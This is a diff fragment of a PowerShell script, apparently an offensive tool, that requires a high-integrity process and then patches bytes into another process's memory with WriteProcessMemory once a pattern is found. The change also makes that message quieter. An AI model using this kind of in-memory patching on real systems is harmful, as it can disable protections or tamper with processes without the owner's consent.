@@ -79,12 +79,9 @@ https://github.com/reigningshells
     		return $false
 	}
   
-	$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
-	
-	# Needs Admin privs
-	if (!$IsAdmin) 
-	{
-		Write-Output "`n[!] Administrator privileges are required!`n"
+	# Must be run from high integrity process
+	if(($(whoami /groups) -like "*S-1-16-12288*").length -eq 0) {
+		Write-Output "`n[!] Must be run as administrator!`n"
 		Return
 	}
 
@@ -156,7 +153,7 @@ https://github.com/reigningshells
 
 	if($Found)
 	{
-		Write-Output "Found Pattern!"
+		Write-Verbose "Found Pattern!"
 		[UInt32]$BytesWritten = 0
 		$CallResult = [Kernel32]::WriteProcessMemory($hPID,[IntPtr]$Address,$Patch,$Patch.Length,[ref]$BytesWritten)
 		if($CallResult)
